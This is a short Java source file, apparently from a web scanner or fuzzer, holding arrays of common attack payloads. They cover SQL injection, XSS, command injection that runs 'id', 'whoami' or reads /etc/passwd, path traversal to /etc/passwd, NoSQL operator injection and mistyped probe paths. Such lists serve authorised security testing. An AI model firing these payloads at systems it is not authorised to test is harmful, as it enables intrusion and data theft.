package com.sander;

public class Payloads {
    public static final String[] SQLI = {
        "' OR 1=1 --",
        "' UNION SELECT NULL,NULL,NULL --",
        "admin' --",
        "' OR SLEEP(5) --"
    };
    public static final String[] XSS = {
        "<script>alert(1)</script>",
        "\"><img src=x onerror=alert(1)>"
    };
    public static final String[] RCE = {
        "; id",
        "| whoami",
        "&& cat /etc/passwd"
    };
    public static final String[] LFI = {
        "../../etc/passwd",
        "....//....//etc/passwd"
    };
    public static final String[] API_INJ = {
        "{\"$ne\": null}",
        "{\"$gt\": \"\"}"
    };
    // Typo Map: Cek apakah target nge-respond beda buat path yang salah ketik
    public static final String[] TYPO_MAP = {
        "/admn", "/loginn", "/api/v11", "/index.phpp"
    };
}
